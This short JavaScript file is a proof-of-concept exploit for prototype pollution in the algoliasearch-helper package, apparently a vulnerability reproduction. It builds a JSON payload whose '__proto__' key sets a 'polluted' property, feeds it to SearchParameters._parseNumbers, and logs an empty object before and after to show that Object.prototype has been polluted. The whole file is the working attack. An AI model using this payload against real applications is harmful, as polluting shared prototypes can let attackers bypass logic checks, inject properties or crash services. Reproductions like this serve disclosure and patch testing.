var obj = {};
obj.__proto__.polluted = undefined;
Object.defineProperty(obj, '__proto__', {
    value: obj.__proto__,
    writable: true,
    enumerable: true,
    configurable: true
});
const algohelp = require('algoliasearch-helper');
let payload = JSON.parse('{"__proto__": {"polluted": "yes"}}');
console.log({}.polluted);
algohelp.SearchParameters._parseNumbers(payload);
console.log({}.polluted);